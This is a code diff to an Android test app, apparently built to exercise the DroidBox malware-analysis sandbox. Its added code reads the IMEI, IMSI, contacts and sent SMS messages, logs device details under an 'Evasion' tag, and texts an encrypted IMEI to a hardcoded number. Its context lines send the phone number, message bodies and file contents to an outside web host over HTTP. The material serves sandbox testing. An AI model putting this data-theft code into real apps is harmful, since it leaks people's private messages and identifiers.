@@ -45,6 +45,7 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.provider.Browser;
 import android.telephony.SmsManager;
@@ -74,8 +75,6 @@ public class DroidBoxTests extends Activity {
         this.testGetInstalledApps();
         this.testWriteFile();
         this.testReadFile();
-        this.testContactRead();
-        this.testSMSRead();
         this.testCryptHash();
         this.testCryptAES();
         this.testCryptDES();
@@ -91,7 +90,40 @@ public class DroidBoxTests extends Activity {
     	// IMEI
         TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
         imei = manager.getDeviceId();
+        String imsi = manager.getSubscriberId();
         fileContent = "";
+        
+        Log.v("Evasion", "BRAND: " + Build.BRAND);
+        Log.v("Evasion", "DEVICE: " + Build.DEVICE);
+        Log.v("Evasion", "MODEL: " + Build.MODEL);
+        Log.v("Evasion", "PRODUCT: " + Build.PRODUCT);
+        Log.v("Evasion", "IMEI: " + imei);
+        Log.v("Evasion", "IMSI: " + imsi);
+        
+        // Read contact name
+    	String strUri = "content://contacts/people";
+    	Uri uricontact = Uri.parse(strUri);
+    	Cursor c = this.getContentResolver().query(uricontact, null, null, null, null);    
+    	while (c.moveToNext()) {
+    		// Name at column 16
+    		contactName = c.getString(16);
+    		Log.v("Contact", "Name: " + contactName);
+    	}
+    	
+    	// Read stored sms
+    	strUri = "content://sms/sent";
+    	Uri urisms = Uri.parse(strUri);
+    	c = this.getContentResolver().query(urisms, null, null, null, null);
+    	
+    	while (c.moveToNext()) {
+    		// Addr at column 2
+    		String addr = c.getString(2);
+    		phoneNbr = addr;
+    		Log.v("SMSinbox", "To: " + addr);
+    		// Msg body at column 11
+    		msg = c.getString(11);
+    		Log.v("SMSinbox", "Msg: " + msg);
+    	}
     }
     
     /**
@@ -124,7 +156,11 @@ public class DroidBoxTests extends Activity {
     	Log.v("Test", "[*] testWriteFile()");
     	try {
     		OutputStreamWriter out = new OutputStreamWriter(openFileOutput("myfilename.txt", 0));
-    		out.write("Write a line");
+    		out.write("Write a line\n");
+    		out.close();
+    		// Write tainted data
+    		out = new OutputStreamWriter(openFileOutput("output.txt", 0));
+    		out.write(contactName + "\n");
     		out.close();
     		} catch (IOException e) {
     			e.printStackTrace();
@@ -143,6 +179,20 @@ public class DroidBoxTests extends Activity {
 		      BufferedReader buffreader = new BufferedReader(inputreader);
 		 
 		      String line;
+		      while (( line = buffreader.readLine()) != null) {
+		    	  fileContent += line;
+		      }
+		    }
+		    Log.v("FileContent", fileContent);
+		    instream.close();
+		    
+		    // Read file with tainted data
+		    instream = openFileInput("output.txt");
+		    if (instream != null) {
+		      InputStreamReader inputreader = new InputStreamReader(instream);
+		      BufferedReader buffreader = new BufferedReader(inputreader);
+		      String line;
+		      fileContent += "&";
 		      while (( line = buffreader.readLine()) != null) {
 		    	  fileContent += line;
 		      }
@@ -172,41 +222,10 @@ public class DroidBoxTests extends Activity {
     	Log.v("Test", "[*] testSendSMS()");
         SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage("0735445281", null, "Sending sms...", null, null);
-    }
-    
-    /**
-     * Read contact
-     */
-    public void testContactRead() {
-    	Log.v("Test", "[*] testContactRead()");
-    	String strUri = "content://contacts/people";
-    	Uri uricontact = Uri.parse(strUri);
-    	Cursor c = this.getContentResolver().query(uricontact, null, null, null, null);    
-    	while (c.moveToNext()) {
-    		// Name at column 16
-    		contactName = c.getString(16);
-    		Log.v("Contact", "Name: " + contactName);
-    	}
-    }
-    
-    /**
-     * Read SMS history
-     */
-    public void testSMSRead() {
-    	Log.v("Test", "[*] testSMSRead()");
-    	String strUri = "content://sms/sent";
-    	Uri urisms = Uri.parse(strUri);
-    	Cursor c = this.getContentResolver().query(urisms, null, null, null, null);
-    	
-    	while (c.moveToNext()) {
-    		// Addr at column 2
-    		String addr = c.getString(2);
-    		phoneNbr = addr;
-    		Log.v("SMSinbox", "To: " + addr);
-    		// Msg body at column 11
-    		msg = c.getString(11);
-    		Log.v("SMSinbox", "Msg: " + msg);
-    	}
+        
+        // Sending tainted data
+        sms = SmsManager.getDefault();
+        sms.sendTextMessage("0735445281", null, encryptedImei, null, null);
     }
     
     /**
@@ -326,12 +345,6 @@ public class DroidBoxTests extends Activity {
             urlConnection = (HttpURLConnection) url.openConnection();
             rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
             while ((line = rd.readLine()) != null);
-  
-            // HttpURLConnection sending encrypted tainted data
-            url = new URL("http://pjlantz.com/imei.php?imei=" + encryptedImei);
-            urlConnection = (HttpURLConnection) url.openConnection();
-            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
-            while ((line = rd.readLine()) != null);
             
             // HttpURLConnection sending phone number retrieved from sms db
             url = new URL("http://pjlantz.com/phone.php?phone=" + phoneNbr);
@@ -343,12 +356,6 @@ public class DroidBoxTests extends Activity {
             url = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
             urlConnection = (HttpURLConnection) url.openConnection();
             rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
-            
-            // HttpURLConnection sending contact name retrieved from db
-            url = new URL("http://pjlantz.com/name.php?name=" + contactName.replace(" ", "+"));
-            urlConnection = (HttpURLConnection) url.openConnection();
-            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
-            while ((line = rd.readLine()) != null);
             
             // HttpURLConnection sending file content
             url = new URL("http://pjlantz.com/file.php?file=" + fileContent.replace(" ", "+"));
